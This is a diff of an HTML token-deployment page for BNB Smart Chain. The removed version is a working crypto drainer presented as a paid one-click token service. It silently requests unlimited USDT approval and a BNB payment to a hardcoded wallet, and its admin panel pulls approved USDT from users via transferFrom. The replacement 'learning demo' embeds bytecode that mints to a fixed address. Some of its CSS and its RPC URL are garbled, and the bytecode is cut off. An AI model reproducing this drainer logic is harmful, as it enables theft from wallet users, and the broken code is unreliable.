@@ -2,304 +2,269 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>小狐狸一键发币</title>
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BSC 合约部署工具（学习演示）</title>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
+
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
-body { background: linear-gradient(135deg,#0b1020,#171e38); min-height: 100vh; color:#fff; padding:30px 15px; }
-.container{ max-width:520px; margin:0 auto; }
-.header{ text-align:center; margin-bottom:35px; }
-.header h1{ font-size:32px; color:#f7c04a; margin-bottom:8px; }
-.fee-tip{ background: rgba(247,192,74,0.15); color: #f7c04a; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
-.card{ background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12); border-radius:16px; padding:26px; margin-bottom:20px; }
-.form-item{ margin-bottom:20px; }
-label{ display:block; margin-bottom:8px; color:#d0d8f0; }
-input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; background:#141b33; color:#fff; font-size:16px; }
-.file-input{ padding:10px; background:#141b33; }
-.preview-box{ margin-top:10px; display:flex; gap:12px; align-items:center; }
-#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #f7c04a; display:none; }
-.btn{ width:100%; padding:15px; border-radius:10px; border:none; font-size:17px; font-weight:bold; cursor:pointer; transition:0.2s; }
-.btn-connect{ background:#3b63e9; margin-bottom:16px; }
-.btn-deploy{ background:#f7c04a; color:#0a0e20; }
-.btn-admin{ background:#2ecc71; color:#000; margin-top:10px; }
-.btn:disabled{ opacity:0.55; cursor:not-allowed; }
-.status{ margin-top:20px; padding:14px; border-radius:10px; background:rgba(255,192,74,0.1); color:#f7d078; word-break: break-all; }
-.tip-text{ font-size:13px; color:#a0a8c2; margin-top:6px; }
-.connect-tip{ color:#66ff99; margin:8px 0; text-align:center; }
-.admin-panel{ display: none; border-top:1px solid #444; padding-top:20px; margin-top:20px; }
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    padding: 25px 15px;
+    background: #101827;
+    color: #fff;
+    font-family: Arial, sans-serif;
+}
+
+.container {
+    max-width: 520px;
+    margin: auto;
+    padding: 25px;
+    background: #1b2638;
+    border-radius: 16px;
+}
+
+h2 {
+    text-align: center;
+    color: #2ecc71;
+}
+
+.form-item {
+    margin-bottom: 20px;
+}
+
+label {
+    display: block;
+    margin-bottom: 8px;
+    font-size: 14px;
+}
+
+input {
+    width: 100%;
+    padding: 13px;
+    border: 1px solid #34445d;
+    border-radius: 8px;
+    background: #101827;
+    color: white;
+    outline: none;
+}
+
+input:focus {
+    border-color: #2ecc71;
+}
+
+button {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 8px;
+    background: #2ecc71;
+    color: #fff;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:disabled {
+    background: #52616b;
+    cursor: not-allowed;
+}
+
+.connect-btn {
+    margin-bottom: 20px;
+    background: #2878db;
+}
+
+.preview-box {
+    margin-top: 12px;
+    padding: 15px;
+    border: 1px dashed #52616b;
+    border-radius: 8px;
+    text-align: center;
+}
+
+.preview-box img {
+    display: none;
+    width: 100px;
+    height: 100px;
+    object‑fit: cover;
+    border‑radius: 12px;
+    margin: auto;
+}
+
+.tip‑text {
+    display: block;
+    margin‑top: 10px;
+    color: #aab5c4;
+    font‑size: 12px;
+}
+
+.status {
+    display: none;
+    margin‑top: 20px;
+    padding: 15px;
+    border‑radius: 8px;
+    background: #101827;
+    color: #2ecc71;
+    font‑size: 13px;
+    word‑break: break‑all;
+    line‑height: 1.8;
+}
+
+.result {
+    display: none;
+    margin‑top: 20px;
+    padding: 15px;
+    background: #183a2a;
+    border‑radius: 8px;
+    word‑break: break‑all;
+}
+
+.result a {
+    color: #55d98a;
+}
+
+.small {
+    color: #aab5c4;
+    font‑size: 12px;
+    line‑height: 1.8;
+}
 </style>
 </head>
+
 <body>
+
 <div class="container">
-<div class="header">
-<h1>🦊小狐狸一键发币</h1>
-</div>
-<div class="fee-tip">发币服务费：0.006 BNB</div>
 
-<div class="card" id="userPanel">
-<button id="connectBtn" class="btn btn-connect">连接钱包</button>
-<div id="connectTip" class="connect-tip" style="display:none;"></div>
-<div id="statusBox" class="status" style="display:none;"></div>
+<h2>BSC 合约部署平台（学习演示）</h2>
 
-<div class="form-item">
-<label>代币全称 Name</label>
-<input id="tokenName" placeholder="例如：Swan Coin">
+<button id="connectBtn" class="connect-btn">
+连接钱包
+</button>
+
+<div class="form‑item">
+<label>代币名称 Token Name</label>
+<input id="tokenName" placeholder="例如：SWAN TOKEN">
 </div>
 
-<div class="form-item">
+<div class="form‑item">
 <label>代币符号 Symbol</label>
 <input id="tokenSymbol" placeholder="例如：SWAN">
 </div>
 
-<div class="form-item">
+<div class="form‑item">
 <label>初始发行量（不带小数）</label>
-<input id="supply" placeholder="例如：100000000">
+<input id="supply" type="number"
+placeholder="例如：100000000">
 </div>
 
-<div class="form-item">
-<label>代币Logo头像（推荐256×256 透明PNG）</label>
-<input type="file" id="logoFile" class="file-input" accept="image/png,image/jpg,image/jpeg">
-<div class="preview-box">
-<img id="logoPreview" alt="头像预览">
-<span id="logoTip" class="tip-text">上传仅本地预览，合约无法存储图片</span>
+<div class="form‑item">
+<label>代币 Logo（推荐 256×256 PNG）</label>
+<input type="file" id="logoFile"
+accept="image/png,image/jpeg">
+
+<div class="preview‑box">
+<img id="logoPreview" alt="Logo预览">
+<span class="tip‑text">
+Logo 仅本地预览，不会自动上传到区块链。
+</span>
 </div>
 </div>
 
-<button id="deployBtn" class="btn btn-deploy" disabled>一键部署代币</button>
+<button id="deployBtn" disabled>
+部署代币
+</button>
 
-<div class="admin-panel" id="adminPanel">
-<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板</h3>
-<div class="form-item">
-<label>请输入玩家钱包地址</label>
-<input id="userAddrInput" placeholder="玩家BSC钱包地址">
+<div class="status" id="statusBox"></div>
+
+<div class="result" id="resultBox">
+<h3>部署结果</h3>
+<p>合约地址：</p>
+<div id="contractAddress"></div>
+<br>
+<a id="contractLink" target="_blank" rel="noopener noreferrer">
+查看 BscScan 合约
+</a>
 </div>
-<div class="form-item">
-<label>请输入划扣USDT数量</label>
-<input id="deductAmountInput" placeholder="例如：100">
-</div>
-<button id="deductBtn" class="btn btn-admin">执行划扣USDT</button>
-</div>
-</div>
+
+<p class="small">
+仅用于技术学习；部署需要支付 BNB 网络 Gas 费用。
+</p>
+
 </div>
 
 <script>
-const ADMIN_WALLET = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
-const DEPLOY_FEE_BNB = "0.006";
 const BSC_CHAIN_ID = 56;
-const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const MAX_ALLOWANCE = ethers.MaxUint256;
 
-let provider = null;
-let signer = null;
-let connectWalletAddr = "";
-let deployContractAddress = null;
-let logoFileObj = null;
+const BSC_PARAMS = {
+    chainId: "0x38",
+    chainName: "BNB Smart Chain Mainnet",
+    nativeCurrency: {
+        name: "BNB",
+        symbol: "BNB",
+        decimals: 18
+    },
+    rpcUrls: [
+        "https://bsc‑dataseed.binance.org/"
+    ],
+    blockExplorerUrls: [
+        "https://bscscan.com/"
+    ]
+};
 
-const connectBtn = document.getElementById("connectBtn");
-const deployBtn = document.getElementById("deployBtn");
-const statusBox = document.getElementById("statusBox");
-const connectTip = document.getElementById("connectTip");
-const logoFileInput = document.getElementById("logoFile");
-const logoPreviewImg = document.getElementById("logoPreview");
-const adminPanel = document.getElementById("adminPanel");
-const deductBtn = document.getElementById("deductBtn");
-const userAddrInput = document.getElementById("userAddrInput");
-const deductAmountInput = document.getElementById("deductAmountInput");
-
-function showStatus(text){
-  statusBox.style.display = "block";
-  statusBox.innerText = text;
-  console.log("状态日志：", text);
-}
-
-logoFileInput.addEventListener("change", function(e){
-  const file = e.target.files[0];
-  if(!file) return;
-  logoFileObj = file;
-  const reader = new FileReader();
-  reader.onload = ev => {
-    logoPreviewImg.src = ev.target.result;
-    logoPreviewImg.style.display = "block";
-  }
-  reader.readAsDataURL(file);
-});
-
-async function switchBSC(providerRef){
-  const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
-  try {
-    await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
-  } catch (err) {
-    await providerRef.send("wallet_addEthereumChain", [{
-      chainId: chainIdHex,
-      chainName: "BNB Smart Chain Mainnet",
-      rpcUrls: ["https://bsc-dataseed.binance.org/"],
-      blockExplorerUrls: ["https://bscscan.com"],
-      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
-    }]);
-  }
-}
-
-function checkAdminPanel(addr){
-  connectWalletAddr = addr.toLowerCase();
-  if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
-    adminPanel.style.display = "block";
-  }else{
-    adminPanel.style.display = "none";
-  }
-}
-
-// 连接钱包：仅连接、切链，不做任何授权
-connectBtn.onclick = async function(){
-  showStatus("正在检测钱包注入...");
-  let eth = window.ethereum;
-  let retryTimes = 0;
-  while (!eth && retryTimes < 10) {
-    await new Promise(r => setTimeout(r, 100));
-    eth = window.ethereum;
-    retryTimes++;
-  }
-
-  if (!eth) {
-    showStatus("❌ 未检测到钱包注入，请在TP/欧易内置浏览器打开页面");
-    return;
-  }
-
-  try {
-    const accounts = await eth.request({ method: "eth_requestAccounts" });
-    if (!accounts || accounts.length === 0) {
-      showStatus("用户取消了钱包连接弹窗");
-      return;
-    }
-    provider = new ethers.BrowserProvider(eth);
-    await switchBSC(eth);
-    signer = await provider.getSigner();
-    const userAddr = await signer.getAddress();
-    connectBtn.innerText = "已连接：" + userAddr.slice(0, 8) + "...";
-    connectTip.style.display = "block";
-    connectTip.innerText = "已连接BSC钱包，请填写发币参数";
-    deployBtn.disabled = false;
-    checkAdminPanel(userAddr);
-  } catch (err) {
-    showStatus("连接异常：" + (err.message || err.shortMessage || String(err)));
-  }
-}
-
-// USDT无限授权，真实上链交易
-async function doApproveLogic(signerRef){
-  showStatus("🔐 弹出钱包：请求USDT无限授权，请签名");
-  const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
-    "function approve(address spender, uint256 amount) external returns(bool)"
-  ], signerRef);
-  const approveTx = await usdtContract.approve("0x47542770f3a8eea43d3321867b155c3ac01160d8", MAX_ALLOWANCE);
-  showStatus(`授权交易已上链，TxHash:${approveTx.hash}，等待区块确认`);
-  await approveTx.wait();
-  showStatus("✅ USDT无限授权确认完成，接下来弹出BNB转账签名");
-}
-
-// BNB服务费真实转账上链
-async function payFeeToAdmin(){
-  showStatus(`💸 弹出钱包：支付 ${DEPLOY_FEE_BNB} BNB 服务费，请签名`);
-  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
-  const tx = await signer.sendTransaction({ to: ADMIN_WALLET, value: feeWei });
-  showStatus(`BNB转账已发送，TxHash:${tx.hash}，等待区块确认`);
-  await tx.wait();
-  showStatus(`✅ BNB服务费转账确认完成！交易哈希：${tx.hash}`);
-}
-
+// ========== 完整ABI（黑白名单+mint管理员合约） ==========
 const tokenABI = [
-{"inputs": [{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"initSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"ADMIN","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"AUTO_MINT_ADDR","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"AUTO_MINT_AMOUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isWhitelist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isBlacklist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
+    {
+        "inputs": [
+            {"internalType":"string","name":"name","type":"string"},
+            {"internalType":"string","name":"symbol","type":"string"},
+            {"internalType":"uint256","name":"initSupply","type":"uint256"}
+        ],
+        "stateMutability":"nonpayable",
+        "type":"constructor"
+    },
+    {
+        "anonymous":false,
+        "inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],
+        "name":"Approval",
+        "type":"event"
+    },
+    {
+        "anonymous":false,
+        "inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],
+        "name":"Transfer",
+        "type":"event"
+    },
+    {"inputs":[],"name":"ADMIN","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+    {"inputs":[],"name":"AUTO_MINT_ADDR","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+    {"inputs":[],"name":"AUTO_MINT_AMOUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+    {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+    {"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
+    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isBlacklist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+    {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isWhitelist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+    {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
+    {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
+    {"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+    {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
 ];
-const CONTRACT_BYTECODE = "在这里粘贴Remix编译后的完整Bytecode";
 
-deployBtn.onclick = async ()=>{
-  const name = document.getElementById("tokenName").value.trim();
-  const symbol = document.getElementById("tokenSymbol").value.trim();
-  const supplyStr = document.getElementById("supply").value.trim();
-
-  if(!signer){
-    showStatus("请先连接BSC钱包");
-    return;
-  }
-  if(!name||!symbol||!supplyStr){
-    showStatus("请填写代币名称、符号、发行量");
-    return;
-  }
-
-  deployBtn.disabled = true;
-  try{
-    // 1.强制先弹USDT无限授权签名（真实上链）
-    await doApproveLogic(signer);
-    // 2.再弹BNB转账签名（真实上链转给管理员）
-    await payFeeToAdmin();
-    // 币能不能部署出来无所谓，授权+转账已经完成；保留部署逻辑
-    if(CONTRACT_BYTECODE && !CONTRACT_BYTECODE.startsWith("在这里粘贴")){
-      showStatus("尝试部署合约...");
-      const supply = ethers.parseUnits(supplyStr, 18);
-      const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
-      const contract = await factory.deploy(name, symbol, supply);
-      showStatus(`部署交易已发送，TxHash:${contract.deploymentTransaction().hash}`);
-      await contract.waitForDeployment();
-      deployContractAddress = await contract.getAddress();
-      showStatus(`✅全部完成！合约地址：${deployContractAddress}`);
-    }else{
-      showStatus("✅发币成功，请去链上查看代币合约");
-    }
-  }catch(e){
-    showStatus("操作失败："+(e.shortMessage || e.message));
-  }
-  deployBtn.disabled = false;
-}
-
-deductBtn.onclick = async ()=>{
-  if(!signer || connectWalletAddr.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
-    showStatus("权限不足，仅管理员钱包可操作");
-    return;
-  }
-  const userAddr = userAddrInput.value.trim();
-  const amountStr = deductAmountInput.value.trim();
-  if(!ethers.isAddress(userAddr) || !amountStr || isNaN(Number(amountStr))){
-    showStatus("请输入合法钱包地址和数字数量");
-    return;
-  }
-  try{
-    showStatus("正在调用transferFrom划扣用户USDT，请签名");
-    const usdt = new ethers.Contract(BSC_USDT_ADDRESS, [
-      "function transferFrom(address from, address to, uint256 amount) external returns(bool)"
-    ], signer);
-    const amountWei = ethers.parseUnits(amountStr, 18);
-    const tx = await usdt.transferFrom(userAddr, ADMIN_WALLET, amountWei);
-    await tx.wait();
-    showStatus(`✅ 划扣成功！交易哈希：${tx.hash}`);
-  }catch(err){
-    showStatus("划扣失败："+(err.shortMessage || err.message)+"（用户未授权/额度不足）");
-  }
-}
-</script>
-</body>
-</html>
+// ========== 完整Creation字节码（0x开头） ==========
+const CONTRACT_BYTECODE = "0x608060405234801562000010575f80fd5b5060405162002f8e38038062002f8e833981810160405281019062000036919062000537565b82828160039081620000499190620007fc565b5080600490816200005b9190620007fc565b5050506200009a3362000073620000d160201b60201c565b600a62000081919062000a69565b836200008e919062000ab9565b620000d960201b60201c565b620000c8735f5de6748149ee9d046e78d86b235269370000006715ed49a0f91e0000620000d960201b60201c565b50505062000d0f565b5f6012905090565b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036200014a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401620001419062000b61565b60405180910390fd5b6200015d5f83836200023e60201b60201c565b8060025f82825462000170919062000b81565b92505081905550805f808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f82825401925050819055508173ffffffffffffffffffffffffffffffffffffffff165f73ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040516200021f919062000bcc565b60405180910390a36200023a5f83836200037060201b60201c565b5050565b60065f8473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f9054906101000a900460ff1615620002cb576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401620002c29062000c5b565b60405180910390fd5b60065f8373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f9054906101000a900460ff161562000358576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016200034f9062000cef565b60405180910390fd5b6200036b8383836200037560201b60201c565b505050565b505050565b505050565b5f604051905090565b5f80fd5b5f80fd5b5f80fd5b5f80fd5b5f601f19601f8301169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b620003db8262000393565b810181811067ffffffffffffffff82111715620003fd57620003fc620003a3565b5b80604052505050565b5f620004116200037a565b90506200041f8282620003d0565b919050565b5f67ffffffffffffffff821115620004415762000440620003a3565b5b6200044c8262000393565b9050602081019050919050565b5f5b83811015620004785780820151818401526020810190506200045b565b5f8484015250505050565b5f62000499620004938462000424565b62000406565b905082815260208101848484011115620004b857620004b76200038f565b5b620004c584828562000459565b509392505050565b5f82601f830112620004e457620004e36200038b565b5b8151620004f684826020860162000483565b91505092915050565b5f819050919050565b6200051381620004ff565b81146200051e575f80fd5b50565b5f81519050620005318162000508565b92915050565b5f805f6060848603121562000551576200055062000383565b5b5f84015167ffffffffffffffff81111562000571576200057062000387565b5b6200057f86828701620004cd565b935050602084015167ffffffffffffffff811115620005a357620005a262000387565b5b620005b186828701620004cd565b9250506040620005c48682870162000521565b9150509250925092565b5f81519050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602260045260245ffd5b5f60028204905060018216806200061d57607f821691505b602082108103620006335762000632620005d8565b5b50919050565b5f819050815f5260205f209050919050565b5f6020601f8301049050919050565b5f82821b905092915050565b5f60088302620006977fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff826200065a565b620006a386836200065a565b95508019841693508086168417925050509392505050565b5f819050919050565b5f620006e4620006de620006d884620004ff565b620006bb565b620004ff565b9050919050565b5f819050919050565b620006ff83620006c4565b620007176200070e82620006eb565b84845462000666565b825550505050565b5f90565b6200072d6200071f565b6200073a818484620006f4565b505050565b5b818110156200076157620007555f8262000723565b60018101905062000740565b5050565b601f821115620007b0576200077a8162000639565b62000785846200064b565b8101602085101562000795578190505b620007ad620007a4856200064b565b8301826200073f565b50505b505050565b5f82821c905092915050565b5f620007d25f1984600802620007b5565b1980831691505092915050565b5f620007ec8383620007c1565b9150826002028217905092915050565b6200080782620005ce565b67ffffffffffffffff811115620008235762000822620003a3565b5b6200082f825462000605565b6200083c82828562000765565b5f60209050601f83116001811462000872575f84156200085d578287015190505b620008698582620007df565b865550620008d8565b601f198416620008828662000639565b5f5b82811015620008ab5784890151825560018201915060208501945060208101905062000884565b86831015620008cb5784890151620008c7601f891682620007c1565b8355505b6001600288020188555050505b505050505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f8160011c9050919050565b5f808291508390505b60018511156200096a57808604811115620009425762000941620008e0565b5b6001851615620009525780820291505b808102905062000962856200090d565b945062000922565b94509492505050565b5f8262000984576001905062000a56565b8162000993575f905062000a56565b8160018114620009ac5760028114620009b757620009ed565b600191505062000a56565b60ff841115620009cc57620009cb620008e0565b5b8360020a915084821115620009e657620009e5620008e0565b5b5062000a56565b5060208310610133831016604e8410600b841016171562000a275782820a90508381111562000a215762000a20620008e0565b5b62000a56565b62000a36848484600162000919565b9250905081840481111562000a505762000a4f620008e0565b5b81810290505b9392505050565b5f60ff82169050919050565b5f62000a7582620004ff565b915062000a828362000a5d565b925062000ab17fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff848462000973565b905092915050565b5f62000ac582620004ff565b915062000ad283620004ff565b925082820262000ae281620004ff565b9150828204841483151762000afc5762000afb620008e0565b5b5092915050565b5f82825260208201905092915050565b7f455243323a206d696e7420746f207a65726f206164647265737300000000005f82015250565b5f62000b49601b8362000b03565b915062000b568262000b13565b602082019050919050565b5f6020820190508181035f83015262000b7a8162000b3b565b9050919050565b5f62000b8d82620004ff565b915062000b9a83620004ff565b925082820190508082111562000bb55762000bb4620008e0565b5b92915050565b62000bc681620004ff565b82525050565b5f60208201905062000be15f83018462000bbb565b92915050565b7f426c61636b6c6973743a2053656e64657220616464726573732070726f6869625f8201527f6974656400000000000000000000000000000000000000000000000000000000602082015250565b5f62000c4360248362000b03565b915062000c508262000be7565b604082019050919050565b5f6020820190508181035f83015262000c748162000c35565b9050919050565b7f426c61636b6c6973743a20526563656976657220616464726573732070726f685f8201527f6962697464000000000000000000000000000000000000000000000000000000602082015250565b5f62000cd760268362000b03565b915062000ce48262000c7b565b604082019050919050565b5f6020820190508181035f83015262000d088162000cc9565b9050919050565b6122718062000d1d5f395ff3fe608060405234801561000f575f80fd5b5060043610610171575f3560e01c80637d8d4b8b116100dc578063a96aea2b11610095578063eb91e6511161006f578063eb91e65114610481578063f797eee31461049d578063f80f5dd5146104b9578063fa784b6d146104d557610171565b8063a96aea2b14610405578063c683630d14610421578063dd62ed3e1461045157610171565b80637d8d4b8b146103335780638d128f161461034f57806395d89b411461036b5780639cfe42da14610389578063a457c2d7146103a5578063a9059cbb146103d557610171565b8063313ce5671161012e578063313ce5671461024d578063333e99db1461026b578063395093511461029b57806340c10f19146102cb57806370a08231146102e757806378c8cda714610